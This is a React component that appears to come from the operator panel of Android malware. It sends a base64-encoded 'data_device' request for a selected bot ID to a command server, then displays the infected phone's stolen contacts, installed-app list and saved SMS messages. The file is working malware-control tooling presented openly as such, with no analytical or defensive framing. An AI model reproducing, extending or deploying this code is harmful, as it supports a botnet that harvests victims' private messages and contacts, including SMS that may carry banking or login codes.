import React from 'react';
import { isNullOrUndefined } from 'util';
import SettingsContext from '../../Settings';
import { try_eval } from '../../serviceF';
import $ from 'jquery';

class LogsModal extends React.Component {
    constructor(props)
    {
        super(props);
        this.state = {
            contacts: '',
            applications: '',
            arraySavedSMS: []
        };
    }

    componentWillReceiveProps() {
        if(SettingsContext.start_modul != 'LogsDevice'){
            return;
        }
        this.onLoadJson();
    }

    Base64DecodeToStr(base64str) {
        return new Buffer(base64str.toString()  == null ? '' : base64str.toString(), 'base64').toString('utf-8');
    }

    onLoadJson () {
        if(SettingsContext.CurrentSetBot.length < 1) {
            return;
        }
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.url_connect,
            data: {
                'params': new Buffer('{"sent_request":"data_device","idbot":"' + SettingsContext.CurrentSetBot + '"}').toString('base64')
            }
        });

        request.done(function(msg) {
			try {
				let result = JSON.parse(msg);
				if(!isNullOrUndefined(result.error)){
					SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
				}else{
					this.setState({
                        myObjJS: result,
						contacts: result.contacts,
						applications: result.applications,
						arraySavedSMS: result.sms
					});
				}
			
            }
            catch (ErrMgs) {
                SettingsContext.ShowToastTitle('error', 'ERROR', 'Error bot settings. Look console for more details.');
                console.log('Error - ' + ErrMgs);
            }
        }.bind(this));
    }

    render () {
      
       let strContacts = '';
       for(let i=0;i<this.state.contacts.length;i++){
            strContacts += '📱 ' +  this.Base64DecodeToStr(this.state.contacts[i]) + '\n';
       }

       let strApps = '';
       for(let i=0;i<this.state.applications.length;i++){
        strApps += '★ ' +  this.Base64DecodeToStr(this.state.applications[i]) + '\n';
       }

       
       let strLogs = '';
       for(let i=0;i<this.state.arraySavedSMS.length;i++){
        strLogs += '✓ '  + this.Base64DecodeToStr(this.state.arraySavedSMS[i]) + '\n\n';
       }
       
        return (

            <div class="modal fade" id="LogsDevice" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
            <div class="modal-dialog modal-lg2" role="document">
                <div class="modal-content ">
                <div class="modal-header">
                    <h5>Data device</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                
                <div style={({overflow: 'hidden'})}>

               
                    <div class="divLogs3_1"><center><b>Saved contacts</b></center> <div  style={({paddingLeft:'5px'})}> {strContacts}</div></div>
                    
                    <div class="divLogs3_1"><center><b>All installed applications</b></center> <div  style={({paddingLeft:'5px'})}> {strApps}</div></div>
                    <div class="divLogs3_2"><center><b>List saved SMS</b></center> <div  style={({paddingLeft:'5px'})}> {strLogs}</div></div>
                    
                </div>

               
                
                </div>
            </div>
        </div>
     
        );
    }
}

export default LogsModal;